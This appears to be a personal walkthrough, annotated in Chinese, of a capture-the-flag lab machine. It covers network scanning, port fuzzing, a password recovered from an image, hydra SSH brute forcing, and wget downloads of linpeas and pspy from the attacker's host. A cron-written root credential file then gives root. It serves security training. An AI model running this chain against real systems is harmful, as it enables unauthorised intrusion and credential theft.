@@ -1,0 +1,179 @@
+#IP
+arp-scan -l
+#192.168.1.37
+
+nmap -sS -P0 192.168.1.37
+# 22/tcp  open  ssh
+# 32/tcp  open  unknown
+# 33/tcp  open  dsp
+# 37/tcp  open  time
+# 42/tcp  open  nameserver
+# 43/tcp  open  whois
+# ...
+# 445/tcp open  microsoft-ds
+# 458/tcp open  appleqtc
+# 464/tcp open  kpasswd5
+# 465/tcp open  smtps
+# 481/tcp open  dvs
+# 497/tcp open  retrospect
+# 500/tcp open  isakmp
+# 512/tcp open  exec
+# 513/tcp open  login
+# 514/tcp open  shell
+# 515/tcp open  printer
+# 524/tcp open  ncp
+# 541/tcp open  uucp-rlogin
+# 543/tcp open  klogin
+# 544/tcp open  kshell
+# 545/tcp open  ekshell
+# 548/tcp open  afp
+# 554/tcp open  rtsp
+# 555/tcp open  dsf
+开放非常多的端口,但是web端口并不是80 443 等
+
+nmap -sS p 22,80 -A 192.168.1.37
+# Nmap scan report for 192.168.1.37
+# Host is up (0.00018s latency).
+# PORT   STATE SERVICE VERSION
+# 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+# | ssh-hostkey: 
+# |   2048 6afed61723cb90792bb12d3753974658 (RSA)
+# |   256 5bc468d18959d748b096f311871c08ac (ECDSA)
+# |_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
+# 80/tcp open  http    PHP cli server 5.5 or later
+# |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+# MAC Address: 08:00:27:D6:65:98 (Oracle VirtualBox virtual NIC)
+# Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+# Device type: general purpose
+# Running: Linux 4.X|5.X
+# OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+# OS details: Linux 4.15 - 5.6
+# Network Distance: 1 hop
+# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+#生成 1-1000的端口列表文件， wfuzz测试，那个端口访问web网页，字数不一样
+wfuzz -u 'http://192.168.1.37:FUZZ' -w ./portlist.txt
+# 258
+http://192.168.1.37:258
+# whatever. ssh username is: satan, raphael, angel, distress, greed or lust
+
+#查看 ok 图片
+steghide info hand.png
+#没有隐藏信息
+
+#将图片放大 发现md5加密后的字符串
+bfe2kjgdf9739j23h8dga8qh2
+
+#MD5 解密
+solomon1
+
+#用户名写入user.txt solomon1写入pass.txt
+#hydra 爆破
+hydra -L ./user.txt -P ./pass.txt -vV -e ns 192.168.1.37 ssh
+# [ATTEMPT] target 192.168.1.37 - login "lust" - pass "solomon1" - 18 of 21 [child 4] (0/3)
+# [VERBOSE] Retrying connection for child 10
+[22][ssh] host: 192.168.1.37   login: angel   password: solomon1
+# [REDO-ATTEMPT] target 192.168.1.37 - login "satan" - pass "satan" - 19 of 21 [child 1] (1/3)
+# [REDO-ATTEMPT] target 192.168.1.37 - login "raphael" - pass "raphael" - 20 of 21 [child 8] (2/3)
+# [STATUS] attack finished for 192.168.1.37 (waiting for children to complete tests)
+
+#ssh 连接靶机
+ssh angel@192.168.1.37
+: solomon1
+#登录成功
+
+#获得 user flag
+cat user.txt
+#flag 1/2
+
+提权 root:
+uname -a
+#Linux grotesque 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
+
+#尝试提权脚本 cve-2018-18955.sh
+提权失败 没有安装gcc
+
+#kali攻击机 搭建python临时服务器
+python -m http.server 8083 --bind=192.168.1.15
+
+#wget 下载 linpeas 和 pspy64  收集
+wget http://192.168.1.15:8083/linpeas.sh
+wget http://192.168.1.15:8083/pspy64
+
+#查看quiet目录
+发现很多文件
+# -rw-r--r-- 1 root  root     60 May 20 22:20 994
+# -rw-r--r-- 1 root  root     60 May 20 22:20 995
+# -rw-r--r-- 1 root  root     60 May 20 22:20 996
+# -rw-r--r-- 1 root  root     60 May 20 22:20 997
+# -rw-r--r-- 1 root  root     60 May 20 22:20 998
+# -rw-r--r-- 1 root  root     60 May 20 22:20 999
+# ...
+
+#使用 linux提权信息收集脚本 linpeas.sh
+./linpeas.sh
+# ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/rootcreds.txt                                                                                                      
+# /var/log/wtmp
+# /var/log/lastlog
+# /var/log/auth.log
+# /var/log/syslog
+# /var/log/daemon.log
+最近5分钟修改的文件
+
+#使用 pspy64  进程监控，实时监控执行了那些操作
+./pspy64
+
+#尝试删除quiet目录下的所有文件，过一会又自动写入了
+#每过一段时间，就会定时任务  自动执行check.sh write.sh
+
+#查看最近五分钟 写入的文件
+# ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/rootcreds.txt                                                                                                      
+# /var/log/wtmp
+# /var/log/lastlog
+# /var/log/auth.log
+# /var/log/syslog
+# /var/log/daemon.log
+最近5分钟修改的文件
+
+#查看文件
+cat /rootcreds.txt
+# root
+# sweetchild
+这应该是自动备份了  root 用户名和密码
+
+#尝试登录root
+su - root
+: sweetchild
+#提权成功
+
+id
+#uid=0(root) gid=0(root) groups=0(root)
+
+#获得root flag
+cd /root
+cat root.txt
+#flag 2/2
+
+#全部完成
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
